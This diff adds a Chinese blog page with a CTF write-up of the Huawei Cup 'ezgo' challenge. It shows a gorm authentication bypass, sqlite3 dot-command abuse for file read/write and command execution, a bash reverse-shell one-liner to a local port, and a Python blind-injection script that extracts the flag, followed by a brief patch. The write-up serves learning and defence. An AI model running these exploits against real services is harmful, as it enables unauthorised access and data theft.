@@ -1,0 +1,758 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Preface2023年11月11日晚，光棍节打CTF受不了一点 队友去打线下的华为杯了😭留我一人受强网拟态的煎熬 队友把当天一些题目的附件发给我看了，这次ADWP的题目还挺有意思的，复现一波 📌注：笔者没有参加线下的华为杯，以下均基于题目附件和笔者自己的猜想，可能会与实际环境有所区别。 ezgo一个简单的登录系统，admin用户可以获取sqlite数据库的交互权限 用户表结构如下，采用gor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="华为杯ADWP赛后复现">
+<meta property="og:url" content="http://example.com/2023/11/12/HuaWeiCup/index.html">
+<meta property="og:site_name" content="p4d0rn&#39;s Labyrinth">
+<meta property="og:description" content="Preface2023年11月11日晚，光棍节打CTF受不了一点 队友去打线下的华为杯了😭留我一人受强网拟态的煎熬 队友把当天一些题目的附件发给我看了，这次ADWP的题目还挺有意思的，复现一波 📌注：笔者没有参加线下的华为杯，以下均基于题目附件和笔者自己的猜想，可能会与实际环境有所区别。 ezgo一个简单的登录系统，admin用户可以获取sqlite数据库的交互权限 用户表结构如下，采用gor">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20231112145149789.png">
+<meta property="og:image" content="http://example.com/img/image-20231112142510360.png">
+<meta property="og:image" content="http://example.com/img/image-20231112142649924.png">
+<meta property="og:image" content="http://example.com/img/image-20231112142829402.png">
+<meta property="og:image" content="http://example.com/img/image-20231112160949613.png">
+<meta property="og:image" content="http://example.com/img/image-20231112163450828.png">
+<meta property="og:image" content="http://example.com/img/image-20231112161303304.png">
+<meta property="og:image" content="http://example.com/img/image-20231112163038519.png">
+<meta property="og:image" content="http://example.com/img/image-20231112163136538.png">
+<meta property="og:image" content="http://example.com/img/image-20231112165353256.png">
+<meta property="og:image" content="http://example.com/img/image-20231112164124316.png">
+<meta property="og:image" content="http://example.com/img/image-20231112170339313.png">
+<meta property="og:image" content="http://example.com/img/image-20231112170455361.png">
+<meta property="og:image" content="http://example.com/img/image-20231112173602769.png">
+<meta property="og:image" content="http://example.com/img/image-20231112173653223.png">
+<meta property="og:image" content="http://example.com/img/image-20231112174533014.png">
+<meta property="og:image" content="http://example.com/img/image-20231112182041097.png">
+<meta property="og:image" content="http://example.com/img/image-20231112182134422.png">
+<meta property="og:image" content="http://example.com/img/image-20231112191041571.png">
+<meta property="og:image" content="http://example.com/img/image-20231112190956658.png">
+<meta property="og:image" content="http://example.com/img/image-20231112191459123.png">
+<meta property="og:image" content="http://example.com/img/image-20231112194631748.png">
+<meta property="og:image" content="http://example.com/img/image-20231112195849963.png">
+<meta property="og:image" content="http://example.com/img/image-20231112195926441.png">
+<meta property="article:published_time" content="2023-11-12T04:53:03.000Z">
+<meta property="article:modified_time" content="2023-11-12T12:00:18.859Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20231112145149789.png">
+  
+  
+  
+  <title>华为杯ADWP赛后复现 - p4d0rn&#39;s Labyrinth</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>p4d0rn&#39;s labyrinth</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="华为杯ADWP赛后复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-12 12:53" pubdate>
+          2023年11月12日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          67 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">华为杯ADWP赛后复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>2023年11月11日晚，光棍节打CTF受不了一点</p>
+<p>队友去打线下的华为杯了😭留我一人受强网拟态的煎熬</p>
+<p>队友把当天一些题目的附件发给我看了，这次ADWP的题目还挺有意思的，复现一波</p>
+<p>📌注：笔者没有参加线下的华为杯，以下均基于题目附件和笔者自己的猜想，可能会与实际环境有所区别。</p>
+<h1 id="ezgo"><a href="#ezgo" class="headerlink" title="ezgo"></a>ezgo</h1><p>一个简单的登录系统，admin用户可以获取sqlite数据库的交互权限</p>
+<p>用户表结构如下，采用<code>gorm</code>实现对象关系映射</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>	gorm.Model<br>	Id       <span class="hljs-type">int</span> <span class="hljs-string">`gorm:&quot;primaryKey&quot;`</span><br>	UserName <span class="hljs-type">string</span><br>	Password <span class="hljs-type">string</span><br>	Token    <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>系统有三个路由，分别是<em>注册</em>、<em>登录</em>、<em>数据库交互</em></p>
+<p>想要得到数据库的交互权限，需要获取admin的token</p>
+<p>先看注册和登录的逻辑</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">register</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	username := c.PostForm(<span class="hljs-string">&quot;username&quot;</span>)<br>	password := c.PostForm(<span class="hljs-string">&quot;password&quot;</span>)<br><br>	user := &amp;User&#123;&#125;<br>	db.Where(<span class="hljs-string">&quot;user_name&quot;</span>, username).First(user)<br>	<span class="hljs-keyword">if</span> user.UserName == username &#123;<br>		c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户名已被注册&quot;</span>&#125;)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	token := randomUUID()<br>	db.Create(&amp;User&#123;<br>		UserName: username,<br>		Password: password,<br>		Token:    token,<br>	&#125;)<br>	c.JSON(http.StatusOK, gin.H&#123;<span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;注册成功&quot;</span>, <span class="hljs-string">&quot;token&quot;</span>: token&#125;)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>注册首先判断数据库中是否已经有username这个用户，后会给新用户生成值为uuid的token</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">login</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	username := c.PostForm(<span class="hljs-string">&quot;username&quot;</span>)<br>	password := c.PostForm(<span class="hljs-string">&quot;password&quot;</span>)<br>	token := c.PostForm(<span class="hljs-string">&quot;token&quot;</span>)<br><br>	user := &amp;User&#123;&#125;<br>	err := db.Where(&amp;User&#123;UserName: username, Password: password, Token: token&#125;).First(&amp;user).Error<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;登录失败&quot;</span>&#125;)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	c.JSON(http.StatusOK, gin.H&#123;<span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;登录成功&quot;</span>, <span class="hljs-string">&quot;user&quot;</span>: user&#125;)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Gorm的<code>Where</code>函数有一个特性，往其传入<code>Model</code>结构体来构造查询的条件语句时，若对象的属性为空值，则生成SQL语句的时候不会为其生成条件语句。紧跟的<code>First</code>函数会为SQL语句加上<code>LIMIT 1</code></p>
+<p>所以登录接口处若传token和password为空字符串，得到的查询SQL语句将会是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">user</span>`<br><span class="hljs-keyword">WHERE</span> `username`<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xxx&#x27;</span><br>LIMIT <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>这样就能获取admin的token了。</p>
+<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>sqlite是一个轻量级的零配置数据库，有几个利用点</p>
+<ul>
+<li><code>ATTACH DATABASE</code>能用来写webshell，但也只局限于PHP这种灵活的脚本语言</li>
+<li><code>load_extension</code>可以加载恶意动态库，但目标环境也没得文件上传</li>
+</ul>
+<p>flag应该就在数据库中或在系统文件里。</p>
+<p><code>sqlite_master</code>表是SQLite的系统表，是为每个SQLite数据库自动创建的特殊表，类似MySQL里的information_schema数据库</p>
+<p><code>sqlite_master</code>有几个重要的字段</p>
+<ul>
+<li>type：表或索引，值为<code>table</code>或<code>index</code></li>
+<li>name：表名或索引名</li>
+<li>sql：创建表使用的sql语句</li>
+</ul>
+<p>因此SQL注入中我们查询<code>sqlite_master</code>的<code>sql</code>字段就能知道数据库中的表结构</p>
+<p><img src="/./../img/image-20231112145149789.png" srcset="/img/loading.gif" lazyload alt="image-20231112145149789"></p>
+<p>发现这个gorm框架还挺方便，直接帮你生成表结构</p>
+<p><img src="/./../img/image-20231112142510360.png" srcset="/img/loading.gif" lazyload alt="image-20231112142510360"></p>
+<p><img src="/./../img/image-20231112142649924.png" srcset="/img/loading.gif" lazyload alt="image-20231112142649924"></p>
+<p>password和token传空字符串，拿到admin的token（实际上这里不传这两个参数，go处理时默认就当成空字符串）</p>
+<p><img src="/./../img/image-20231112142829402.png" srcset="/img/loading.gif" lazyload alt="image-20231112142829402"></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sqlClient</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	clientBody := ClientBody&#123;&#125;<br>	c.BindJSON(&amp;clientBody)<br><br>	user := &amp;User&#123;&#125;<br>	db.Where(<span class="hljs-string">&quot;user_name = ?&quot;</span>, <span class="hljs-string">&quot;admin&quot;</span>).First(user)<br>	result := <span class="hljs-string">&quot;&quot;</span><br>	<span class="hljs-keyword">if</span> clientBody.Token == user.Token &#123;<br>		cmd := exec.Command(<span class="hljs-string">&quot;sqlite3&quot;</span>)<br><br>		stdin, err := cmd.StdinPipe()<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			fmt.Println(err)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br><br>		stdout, err := cmd.StdoutPipe()<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			fmt.Println(err)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br><br>		stderr, err := cmd.StderrPipe()<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			fmt.Println(err)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br><br>		err = cmd.Start()<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			fmt.Println(err)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br><br>		<span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>			scanner := bufio.NewScanner(stdout)<br>			<span class="hljs-keyword">for</span> scanner.Scan() &#123;<br>				fmt.Println(scanner.Text())<br>			&#125;<br>		&#125;()<br><br>		<span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>			scanner := bufio.NewScanner(stderr)<br>			<span class="hljs-keyword">for</span> scanner.Scan() &#123;<br>				fmt.Println(scanner.Text())<br>				result += scanner.Text()<br>			&#125;<br>		&#125;()<br><br>		<span class="hljs-keyword">for</span> _, sql := <span class="hljs-keyword">range</span> clientBody.Sql &#123;<br>			fmt.Fprintln(stdin, sql)<br>		&#125;<br><br>		err = cmd.Wait()<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			fmt.Println(err)<br>			<span class="hljs-keyword">return</span>  <span class="hljs-comment">// 👈 error detected then exit😭</span><br>		&#125;<br>	&#125;<br>	c.JSON(http.StatusOK, gin.H&#123;<span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;交互成功&quot;</span>, <span class="hljs-string">&quot;token&quot;</span>: clientBody.Token, <span class="hljs-string">&quot;result&quot;</span>: result&#125;)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接着<code>client</code>接口的sqlite3交互，它是执行了<code>sqlite3</code>命令，将我们传入的sql数组作为标准输入，然而交互的标准输出只在控制台打印，没有返回给客户端。代码中看似标准错误返回给了客户端，但实际上一旦检测到报错就退出了。</p>
+<p>得益于启动了一个sqlite3交互进程，我们可以利用其自带的一些命令，打开新天地了。</p>
+<h3 id="read-import-读文件"><a href="#read-import-读文件" class="headerlink" title=".read .import 读文件"></a>.read .import 读文件</h3><p><code>.read FILE</code>	Read input from FILE or command output</p>
+<p>若报错可以回显，可以直接用<code>.read</code>读文件</p>
+<p><img src="/./../img/image-20231112160949613.png" srcset="/img/loading.gif" lazyload alt="image-20231112160949613"></p>
+<p><code>.import FILE TABLE</code>	Import data from FILE into TABLE</p>
+<p>可以将文件内容读入表中</p>
+<p><img src="/./../img/image-20231112163450828.png" srcset="/img/loading.gif" lazyload alt="image-20231112163450828"></p>
+<h3 id="output-任意文件写"><a href="#output-任意文件写" class="headerlink" title=".output 任意文件写"></a>.output 任意文件写</h3><p><code>.show</code> 查看当前设置</p>
+<p><img src="/./../img/image-20231112161303304.png" srcset="/img/loading.gif" lazyload alt="image-20231112161303304"></p>
+<p>发现一个设置项为<code>output: stdout</code></p>
+<p><code>.help</code>查找帮助文档发现有一个命令可以修改<code>output</code></p>
+<p><code>.output ?FILE?</code>	Send output to FILE or stdout if FILE is omitted</p>
+<p>修改输出到指定文件中</p>
+<p><img src="/./../img/image-20231112163038519.png" srcset="/img/loading.gif" lazyload alt="image-20231112163038519"></p>
+<p><img src="/./../img/image-20231112163136538.png" srcset="/img/loading.gif" lazyload alt="image-20231112163136538"></p>
+<p><code>.load FILE ?ENTRY?</code>	Load an extension library</p>
+<p>完成文件写后，配合<code>.load</code>可以加载恶意动态链接库</p>
+<p>特别的，<code>.output</code>这里的FILE也可以是<code>stderr</code></p>
+<p>对于这道题来说，把输出重定向到标准错误，正好能实现回显，而不会抛出错误，<code>err = cmd.Wait()</code>的<code>err</code>判断我猜测可能是判断进程退出的状态码，比如<code>exit(0)</code>是正常退出，而程序抛出异常是其他状态码。</p>
+<p><img src="/./../img/image-20231112165353256.png" srcset="/img/loading.gif" lazyload alt="image-20231112165353256"></p>
+<p>成功回显！（这里用<code>.mode column</code>美化一下输出。。太长了也没美化多少）</p>
+<p>注意这里要主动<code>.quit</code>，否则会一直等待子进程退出，而子进程还在等待输入，死循环了。</p>
+<h3 id="shell-命令执行"><a href="#shell-命令执行" class="headerlink" title=".shell 命令执行"></a>.shell 命令执行</h3><p>这个命令也太过于强大了</p>
+<p><code>.shell CMD ARGS...</code>	Run CMD ARGS… in a system shell</p>
+<p><code>.system CMD ARGS...</code>	Run CMD ARGS… in a system shell</p>
+<p><img src="/./../img/image-20231112164124316.png" srcset="/img/loading.gif" lazyload alt="image-20231112164124316"></p>
+<p>配合上面修改<code>output</code>为<code>stderr</code>，直接执行系统命令。或者若目标环境出网直接弹shell了。</p>
+<p><code>sqlite&gt; .shell bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&quot;</code></p>
+<h3 id="sqlite报错盲注"><a href="#sqlite报错盲注" class="headerlink" title="sqlite报错盲注"></a>sqlite报错盲注</h3><p>假设这题没有执行结果的回显，可以考虑报错盲注。（若flag在系统文件里，首先第一步也是通过<code>.load</code>把文件导入表中。）</p>
+<p>翻一下sqlite的文档，随便找了一个<code>json</code>函数</p>
+<p><code>json</code>函数验证由参数指定的字符串，并将其转为最小化的 JSON 字符串（删除了多余的空白）。</p>
+<p>试着传入不合法的json字符串</p>
+<p><img src="/./../img/image-20231112170339313.png" srcset="/img/loading.gif" lazyload alt="image-20231112170339313"></p>
+<p>配合<code>IIF</code>进行条件判断</p>
+<p><img src="/./../img/image-20231112170455361.png" srcset="/img/loading.gif" lazyload alt="image-20231112170455361"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:8088&quot;</span><br>token = <span class="hljs-string">&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getToken</span>():<br>    login_data = &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>    &#125;<br>    r = requests.post(url + <span class="hljs-string">&#x27;/login&#x27;</span>, data=login_data).json()<br>    <span class="hljs-keyword">global</span> token<br>    token = r[<span class="hljs-string">&#x27;user&#x27;</span>][<span class="hljs-string">&#x27;Token&#x27;</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blind</span>():<br>    ans = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>        low = <span class="hljs-number">9</span><br>        high = <span class="hljs-number">128</span><br>        mid = (low + high) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-comment"># sql = &quot;SELECT IIF(UNICODE(substr((SELECT GROUP_CONCAT(sql) FROM sqlite_master WHERE type = &#x27;table&#x27; AND tbl_name NOT like &#x27;sqlite_%%&#x27;), %s, 1)) &lt; %s, 1, json(&#x27;&#123;&#x27;));&quot; \</span><br>            <span class="hljs-comment">#       % (str(i), str(mid))</span><br>            sql = <span class="hljs-string">&quot;SELECT IIF(UNICODE(substr((SELECT GROUP_CONCAT(res) FROM flag), %s, 1)) &lt; %s, 1, json(&#x27;&#123;&#x27;));&quot;</span> \<br>                  % (<span class="hljs-built_in">str</span>(i), <span class="hljs-built_in">str</span>(mid))<br>            payload = &#123;<br>                <span class="hljs-string">&#x27;token&#x27;</span>: token,<br>                <span class="hljs-string">&#x27;sql&#x27;</span>: [<span class="hljs-string">&#x27;.open gorm.db&#x27;</span>, sql, <span class="hljs-string">&#x27;.quit&#x27;</span>]<br>            &#125;<br>            r = requests.post(url + <span class="hljs-string">&#x27;/client&#x27;</span>, json=payload).text<br>            <span class="hljs-keyword">if</span> r != <span class="hljs-string">&#x27;&#x27;</span>:<br>                high = mid<br>            <span class="hljs-keyword">else</span>:<br>                low = mid + <span class="hljs-number">1</span><br>            mid = (low + high) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">9</span> <span class="hljs-keyword">or</span> mid &gt;= <span class="hljs-number">127</span>:<br>            <span class="hljs-keyword">break</span><br>        ans += <span class="hljs-built_in">chr</span>(mid - <span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(ans)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=========Error Based Blind Injection start=========&#x27;</span>)<br>    getToken()<br>    blind()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231112173602769.png" srcset="/img/loading.gif" lazyload alt="image-20231112173602769"></p>
+<p><img src="/./../img/image-20231112173653223.png" srcset="/img/loading.gif" lazyload alt="image-20231112173653223"></p>
+<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><p>防御很简单，判断<code>password</code>和<code>token</code>是否为空字符串即可</p>
+<p><img src="/./../img/image-20231112174533014.png" srcset="/img/loading.gif" lazyload alt="image-20231112174533014"></p>
